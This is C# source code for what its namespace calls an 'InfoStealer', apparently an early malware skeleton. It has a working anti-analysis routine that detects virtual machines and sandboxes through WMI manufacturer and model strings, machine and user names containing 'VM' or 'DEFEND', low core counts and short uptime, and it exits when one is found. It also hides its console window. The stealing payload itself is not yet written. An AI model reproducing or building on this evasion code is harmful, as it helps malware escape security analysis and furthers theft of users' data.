using System;
using System.Management;
using System.Runtime.InteropServices;

namespace InfoStealer
{
	internal class Program
	{
		// Setup Hidden window
		[DllImport("kernel32.dll")]
		static extern IntPtr GetConsoleWindow();
		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
		const int SW_HIDE = 0;
		const int SW_SHOW = 5;

		struct S_data
		{
			public byte[] data;
			public string type;
			public int size;
		}

		static bool is_VM()
		{

			// Check Manufacturer Strings
			var man_searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
			var man_items = man_searcher.Get();
			foreach (var man_item in man_items)
			{
				string manufacturer = man_item["Manufacturer"].ToString().ToLower();
				if ((manufacturer == "microsoft corporation" && man_item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
					|| manufacturer.Contains("vmware")
					|| man_item["Model"].ToString() == "VirtualBox")
				{
					return true;
				}
			}

			string PC_Name = Environment.MachineName.ToUpperInvariant();
			string User_Name = Environment.UserName.ToUpperInvariant();
			if (PC_Name.Contains("VM") || PC_Name.Contains("VIRTUAL") || PC_Name.Contains("DEFEND")) return true;			// Check machine name strings
			if (Environment.ProcessorCount <= 2) return true;																// If less than 2 Processor cores
			if (Environment.TickCount <= 1000) return true;																	// Time since computer started
			if (User_Name.Contains("VM") || User_Name.Contains("VIRTUAL") || User_Name.Contains("DEFEND")) return true;     // Check Username strings

			// !TODO: Check total system memory

			return false;
		}
		

		public static int Main(string[] args)
		{
			try { if (is_VM()) return 255; }
			catch { }

			// Hide Window
			var handle = GetConsoleWindow();
			ShowWindow(handle, SW_HIDE);

			Console.WriteLine("Hello World!");
			System.Threading.Thread.Sleep(5000);
			ShowWindow(handle, SW_SHOW);
			System.Threading.Thread.Sleep(5000);
			return 0;
		}
	}
}
